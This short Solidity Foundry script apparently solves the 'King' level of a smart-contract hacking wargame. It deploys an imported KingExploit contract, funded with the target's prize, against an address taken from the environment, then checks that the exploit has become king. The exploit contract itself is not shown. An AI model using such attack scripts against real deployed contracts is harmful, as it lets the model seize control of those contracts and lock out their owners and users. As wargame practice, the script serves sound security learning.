// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {King} from "../src/King.sol";
import {KingExploit} from "../src/King.e.sol";

contract KingScript is Script {
    King public king;

    function setUp() public {
        king = King(payable(vm.envAddress("TARGET_CONTRACT_ADDRESS")));
    }

    function run() public {
        vm.startBroadcast();

        KingExploit king_exploit = new KingExploit{value: king.prize()}(king);
        assert(king._king() == address(king_exploit));

        vm.stopBroadcast();
    }
}
